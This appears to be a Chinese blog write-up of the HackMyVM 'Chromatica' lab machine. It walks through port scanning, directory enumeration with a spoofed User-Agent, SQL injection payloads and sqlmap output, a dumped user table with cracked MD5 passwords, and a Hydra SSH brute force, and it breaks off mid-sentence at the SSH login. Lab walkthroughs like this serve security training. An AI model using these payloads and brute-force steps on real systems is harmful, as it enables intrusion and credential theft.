<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="Sunset的个人博客" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:title" content="Sunset Blog - 记录学习、生活" data-next-head=""/><meta property="og:description" content="Sunset的个人博客" data-next-head=""/><meta property="og:url" content="http://sunsetaction.top" data-next-head=""/><meta property="og:type" content="website" data-next-head=""/><meta property="og:image" content="http://sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="Sunset Blog" data-next-head=""/><meta property="og:image:width" content="1200" data-next-head=""/><meta property="og:image:height" content="630" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><link rel="canonical" href="http://sunsetaction.top" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><link rel="icon" href="/images/Logo.ico" data-next-head=""/><title data-next-head="">HackMyVM - Chromatica</title><meta name="description" content="Sunset的个人博客 - 记录生活和学习的点滴"/><meta name="keywords" content="sunset, blog, 技术博客, 编程, 个人网站"/><meta name="author" content="Sunset"/><link rel="canonical" href="http://sunsetaction.top"/><meta property="og:title" content="Sunset&#x27;s Blog"/><meta property="og:description" content="记录生活和学习的点滴"/><meta property="og:url" content="http://sunsetaction.top"/><meta property="og:type" content="website"/><link rel="preload" href="/_next/static/css/fe57c22d60846192.css" as="style"/><link rel="stylesheet" href="/_next/static/css/fe57c22d60846192.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-8cac0b4b405cede1.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-4b638ff538b97055.js" defer=""></script><script src="/_next/static/chunks/999-39f23ad0a9336d72.js" defer=""></script><script src="/_next/static/chunks/951-ad0cb56524ddaaf1.js" defer=""></script><script src="/_next/static/chunks/pages/%5Byear%5D/%5Bmonth%5D/%5Bday%5D/%5Bid%5D-4aef857d6036af72.js" defer=""></script><script src="/_next/static/Mvd-cXsbkhN4W5xziNlij/_buildManifest.js" defer=""></script><script src="/_next/static/Mvd-cXsbkhN4W5xziNlij/_ssgManifest.js" defer=""></script></head><body><link rel="preload" as="image" href="/images/logo.png"/><div id="__next"><div class="w-full" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 flex flex-col min-h-screen font-[LXGWWenKai]"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><img src="/images/logo.png" alt="Sunset" class="md:size-18 md:block hidden rounded-full"/><div><div class="flex items-center justify-center md:justify-start"><img src="/images/logo.png" alt="Sunset" class="size-10 rounded-xl md:hidden"/><h1 class="md:text-3xl text-xl font-extrabold text-red-700 ml-4">Sunset&#x27;s Blog</h1></div><div class="mt-2 grid grid-cols-4"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full relative"><div class="flex justify-center"><article class="w-full md:w-3/4 lg:w-2/3 xl:w-4xl px-3 mt-5 md:mt-15 max-w-[800px]"><h1 class="text-xl md:text-2xl font-bold text-red-700">HackMyVM - Chromatica</h1><div class="flex flex-col"><div class="flex text-sm mt-1"><p class="font-bold text-gray-600 md:text-base">SUNSET</p><p class="font-thin text-gray-600 ml-2 md:text-base">2025-04-19</p><p class="font-thin text-gray-600 ml-2 md:text-base">(Updated:<!-- -->2025-04-19<!-- -->)</p></div><div class="flex text-sm mt-1"><p class="font-bold text-gray-600 md:text-base">Category:</p><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700">靶机</span></div><div class="flex flex-wrap text-sm mt-1"><p class="font-bold text-gray-600 md:text-base">Tags:</p><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700">Linux靶机</span><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700">HackMyVM</span><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700">SQL注入</span></div></div><div class="my-8 text-center">加载中...</div></article></div></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><p class="text-sm text-gray-500">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"HackMyVMChromatica","contentHtml":"\u003ch1\u003eChromatica.\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://hackmyvm.eu/machines/machine.php?vm=Chromatica\"\u003ehttps://hackmyvm.eu/machines/machine.php?vm=Chromatica\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003eNotes：\u003cstrong\u003eHope you enjoy it as i did. Credit to: \u003ca href=\"https://shorturl.at/cnHNQ\"\u003ehttps://shorturl.at/cnHNQ\u003c/a\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003ch2\u003e前期踩点\u003c/h2\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Chromatica nmap -sP 192.168.56.0/24                   \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-18 23:16 EDT\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.1\nHost is up (0.00032s latency).\nMAC Address: 0A:00:27:00:00:09 (Unknown)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.2\nHost is up (0.00046s latency).\nMAC Address: 08:00:27:81:EF:A0 (Oracle VirtualBox virtual NIC)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.44\nHost is up (0.00047s latency).\nMAC Address: 08:00:27:2C:9A:BC (Oracle VirtualBox virtual NIC)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜Chromatica nmap -sT -min-rate 10000 -p- 192.168.56.44\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-18 23:16 EDT\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.44\nHost is up (0.00023s latency).\nNot shown: 65532 closed tcp ports (conn-refused)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n5353/tcp open  mdns\nMAC Address: 08:00:27:2C:9A:BC (Oracle VirtualBox virtual NIC)\n\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 8.07 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Chromatica nmap -sT -A -T4 -O -p 22,80,5353 192.168.56.44\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-18 23:17 EDT\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.44\nHost is up (0.00075s latency).\n\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 7c:94:7f:cb:4a:d5:8b:9f:9e:ff:7b:7a:59:ff:75:b5 (ECDSA)\n|_  256 ed:94:2a:\u003cspan class=\"hljs-built_in\"\u003efc\u003c/span\u003e:30:30:cc:07:ae:27:7d:ca:92:01:49:31 (ED25519)\n80/tcp   open  http    Apache httpd 2.4.52 ((Ubuntu))\n|_http-server-header: Apache/2.4.52 (Ubuntu)\n|_http-title: Chromatica|Coming Soon..... \n5353/tcp open  domain  dnsmasq 2.86\n| dns-nsid: \n|_  bind.version: dnsmasq-2.86\nMAC Address: 08:00:27:2C:9A:BC (Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.8\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.75 ms 192.168.56.44\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 47.40 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Chromatica nmap -script=vuln 22,80,5353 192.168.56.44    \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-18 23:18 EDT\nFailed to resolve \u003cspan class=\"hljs-string\"\u003e\"22,80,5353\"\u003c/span\u003e.\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.44\nHost is up (0.00021s latency).\nNot shown: 998 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n|_http-stored-xss: Couldn\u003cspan class=\"hljs-string\"\u003e't find any stored XSS vulnerabilities.\n|_http-csrf: Couldn'\u003c/span\u003et find any CSRF vulnerabilities.\n| http-fileupload-exploiter: \n|   \n|_    Couldn\u003cspan class=\"hljs-string\"\u003e't find a file-type field.\n|_http-dombased-xss: Couldn'\u003c/span\u003et find any DOM based XSS.\n| http-enum: \n|   /robots.txt: Robots file\n|   /css/: Potentially interesting directory w/ listing on \u003cspan class=\"hljs-string\"\u003e'apache/2.4.52 (ubuntu)'\u003c/span\u003e\n|_  /js/: Potentially interesting directory w/ listing on \u003cspan class=\"hljs-string\"\u003e'apache/2.4.52 (ubuntu)'\u003c/span\u003e\nMAC Address: 08:00:27:2C:9A:BC (Oracle VirtualBox virtual NIC)\n\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 38.43 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003ednsmasq 2.86\u003c/code\u003e 好像存在缓冲区漏洞，但是现在没办法利用\u003c/p\u003e\n\u003ch2\u003eWeb\u003c/h2\u003e\n\u003ch3\u003e信息收集 - 1\u003c/h3\u003e\n\u003cp\u003e访问 \u003ccode\u003eHTTP\u003c/code\u003e 服务\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMChromatica/image.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e目录扫描\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Chromatica gobuster \u003cspan class=\"hljs-built_in\"\u003edir\u003c/span\u003e -u http://192.168.56.44 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,zip -b 403,404                                                              \n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) \u0026#x26; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.56.44\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Negative Status codes:   403,404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,txt,html,zip\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e directory enumeration mode\n===============================================================\n/index.html           (Status: 200) [Size: 4047]\n/assets               (Status: 301) [Size: 315] [--\u003e http://192.168.56.44/assets/]\n/css                  (Status: 301) [Size: 312] [--\u003e http://192.168.56.44/css/]\n/js                   (Status: 301) [Size: 311] [--\u003e http://192.168.56.44/js/]\n/javascript           (Status: 301) [Size: 319] [--\u003e http://192.168.56.44/javascript/]\n/robots.txt           (Status: 200) [Size: 36]\nProgress: 1102800 / 1102805 (100.00%)\n===============================================================\nFinished\n===============================================================\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e查看 \u003ccode\u003erobots.txt\u003c/code\u003e，给我们新的目录\u003ccode\u003e/dev-portal/\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMChromatica/image1.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e再扫描一遍，发现什么都扫描不出来\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Chromatica gobuster \u003cspan class=\"hljs-built_in\"\u003edir\u003c/span\u003e -u http://192.168.56.44/dev-portal/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,zip -b 403,404\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) \u0026#x26; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.56.44/dev-portal/\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Negative Status codes:   403,404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,txt,html,zip\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e directory enumeration mode\n===============================================================\nProgress: 1102800 / 1102805 (100.00%)\n===============================================================\nFinished\n===============================================================\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e访问页面被 \u003ccode\u003e403\u003c/code\u003e 了\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMChromatica/image2.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e想起上面\u003ccode\u003erobots.txt\u003c/code\u003e 文件的 \u003ccode\u003euser-agent：dev\u003c/code\u003e ，我们将 \u003ccode\u003eUA\u003c/code\u003e 改为 \u003ccode\u003edev\u003c/code\u003e 再去访问\u003c/p\u003e\n\u003cp\u003e已经不是 \u003ccode\u003e403\u003c/code\u003e 了，变成重定向了\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMChromatica/image3.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e跟随重定向，页面有一个搜索框\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMChromatica/image4.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e搜索后点抓包\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMChromatica/image5.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e其中的注释：\u003ccode\u003eplease for the love of god someone paint this page a color will ya it looks dreadfull uhhhhj\u003c/code\u003e看在上帝的份上，谁能给这个页面涂点颜色看看，看起来太可怕了，呃\u003c/p\u003e\n\u003ch3\u003eSQL 注入\u003c/h3\u003e\n\u003cp\u003e测试一下请求参数，发现存在\u003ccode\u003eSQL\u003c/code\u003e注入\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e/dev-portal/search.php?city=xxx\u003cspan class=\"hljs-string\"\u003e' --+\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003eSqlmap\u003c/code\u003e 梭哈\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Chromatica sqlmap -r packet -batch                                                                    \n        ___                                                                                                       \n       __H__\n ___ ___[)]_____ ___ ___  {1.8.11#stable}\n|_ -| . [\u003cspan class=\"hljs-string\"\u003e\"]     | .'| . | \n|___|_  [(]_|_|_|__,|  _|                                                                                         \n      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                        \n\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and ar\ne not responsible for any misuse or damage caused by this program\n                                                                                                                                                                                                                                    \n[*] starting @ 00:55:21 /2025-04-19/\n                                                         \n[00:55:21] [INFO] parsing HTTP request from 'packet'   \ncustom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] Y\n[00:55:32] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test       \n[00:55:32] [INFO] target URL appears to have 4 columns in query                                                   \n[00:55:32] [INFO] URI parameter '#1*' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable                \nURI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N              \nsqlmap identified the following injection point(s) with a total of 61 HTTP(s) requests: \n\n......\n                          \n---         \nParameter: #1* (URI)                     \n    Type: time-based blind\n    Title: MySQL \u003e= 5.0.12 AND time-based blind (query SLEEP)                                                     \n    Payload: http://192.168.56.44/dev-portal/search.php?city=' AND (SELECT 2276 FROM (SELECT(SLEEP(5)))KNyG) AND 'tKEh'='tKEh                                                                                                       \n\n    Type: UNION query                                                                                                                                                                                                               \n    Title: Generic UNION query (NULL) - 4 columns                                                                 \n    Payload: http://192.168.56.44/dev-portal/search.php?city=' UNION ALL SELECT NULL,NULL,CONCAT(0x7171626b71,0x4363747548505149627773496c574576674e636174734c774968547275574d597058494456456363,0x716a707071),NULL-- -             \n---                                 \n[00:55:32] [INFO] the back-end DBMS is MySQL             \nweb server operating system: Linux Ubuntu 22.04 (jammy)\nweb application technology: Apache 2.4.52                                                                         \nback-end DBMS: MySQL \u003e= 5.0.12 (MariaDB fork)                                                                                                                                                                                       \n[00:55:32] [WARNING] HTTP error codes detected during run:                                                        \n500 (Internal Server Error) - 25 times                                                                            \n[00:55:32] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.56.44'\n                                                         \n[*] ending @ 00:55:32 /2025-04-19/    \n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e将用户表 Dump 下来\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e+----+-----------------------------------------------+-----------+-----------------------------+\n| \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e | password                                      | username  | description                 |\n+----+-----------------------------------------------+-----------+-----------------------------+\n| 1  | 8d06f5ae0a469178b28bbd34d1da6ef3              | admin     | admin                       |\n| 2  | 1ea6762d9b86b5676052d1ebd5f649d7              | dev       | developer account \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e taz   |\n| 3  | 3dd0f70a06e2900693fc4b684484ac85 (keeptrying) | user      | user account \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e testing    |\n| 4  | f220c85e3ff19d043def2578888fb4e5              | dev-selim | developer account \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e selim |\n| 5  | aaf7fb4d4bffb8c8002978a9c9c6ddc9              | intern    | intern                      |\n+----+-----------------------------------------------+-----------+-----------------------------+\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003eSqlmap\u003c/code\u003e 这里只能破解出一个密码，我们使用 John 进行尝试，结果还是一样\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Chromatica john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 pass \nUsing default input encoding: UTF-8\nLoaded 5 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])\nWarning: no OpenMP support \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e this \u003cspan class=\"hljs-built_in\"\u003ehash\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e, consider --fork=16\nPress \u003cspan class=\"hljs-string\"\u003e'q'\u003c/span\u003e or Ctrl-C to abort, almost any other key \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e status\nkeeptrying       (?)     \n1g 0:00:00:00 DONE (2025-04-19 01:01) 1.923g/s 27583Kp/s 27583Kc/s 110850KC/s  g101485..*7¡Vamos!\nUse the \u003cspan class=\"hljs-string\"\u003e\"--show --format=Raw-MD5\"\u003c/span\u003e options to display all of the cracked passwords reliably\nSession completed. \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e但是 \u003ccode\u003eadmin\u003c/code\u003e 的 \u003ccode\u003emd5\u003c/code\u003e 值在 \u003ccode\u003ecmd5\u003c/code\u003e 中是可以进行破解的\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMChromatica/image6.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e最后也是找到了，\u003ccode\u003eDecode\u003c/code\u003e 地址：\u003ca href=\"https://hashes.com/en/decrypt/hash\"\u003ehttps://hashes.com/en/decrypt/hash\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMChromatica/image7.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e最后得到密码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e8d06f5ae0a469178b28bbd34d1da6ef3\n1ea6762d9b86b5676052d1ebd5f649d7\n3dd0f70a06e2900693fc4b684484ac85\nf220c85e3ff19d043def2578888fb4e5\naaf7fb4d4bffb8c8002978a9c9c6ddc9\nadm!n\nflaghere\nkeeptrying\nintern00\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e信息收集 - 2\u003c/h3\u003e\n\u003cp\u003e现在拿到用户名密码也没什么用，我们设置 \u003ccode\u003eUA\u003c/code\u003e 再扫描一遍目录\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Chromatica gobuster \u003cspan class=\"hljs-built_in\"\u003edir\u003c/span\u003e -u http://192.168.56.44/dev-portal/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,zip -b 403,404 -H \u003cspan class=\"hljs-string\"\u003e'User-Agent: dev'\u003c/span\u003e\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) \u0026#x26; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.56.44/dev-portal/\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Negative Status codes:   403,404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,txt,html,zip\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e directory enumeration mode\n===============================================================\n/index.html           (Status: 200) [Size: 527]\n/search.php           (Status: 200) [Size: 844]\n/login.php            (Status: 200) [Size: 609]\n/assets               (Status: 301) [Size: 326] [--\u003e http://192.168.56.44/dev-portal/assets/]\n/css                  (Status: 301) [Size: 323] [--\u003e http://192.168.56.44/dev-portal/css/]\nProgress: 1102800 / 1102805 (100.00%)\n===============================================================\nFinished\n===============================================================\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e来到 \u003ccode\u003elogin.php\u003c/code\u003e 进行登录\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMChromatica/image8.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e但是登录进去什么也没有\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMChromatica/image9.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e查看控制台发现状态码 \u003ccode\u003e500\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMChromatica/image10.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e不知道是不是兔子洞，反正是没什么用\u003c/p\u003e\n\u003ch3\u003eSSH 爆破\u003c/h3\u003e\n\u003cp\u003e我们使用数据库中的用户和密码对 \u003ccode\u003essh\u003c/code\u003e 进行爆破\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Chromatica hydra -L users.txt -P passwd.txt -Vv -t 12 192.168.56.44 ssh                                         \n                                                                               \nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-19 01:23:04\n[WARNING] Many SSH configurations \u003cspan class=\"hljs-built_in\"\u003elimit\u003c/span\u003e the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n[DATA] max 12 tasks per 1 server, overall 12 tasks, 45 login tries (l:5/p:9), ~4 tries per task\n[22][ssh] host: 192.168.56.44   login: dev   password: flaghere\n[STATUS] attack finished \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.44 (waiting \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e children to complete tests)                               \n1 of 1 target successfully completed, 1 valid password found                                                      \nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-04-19 01:23:18 \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e进行 \u003ccode\u003eSSH\u003c/code\u003e 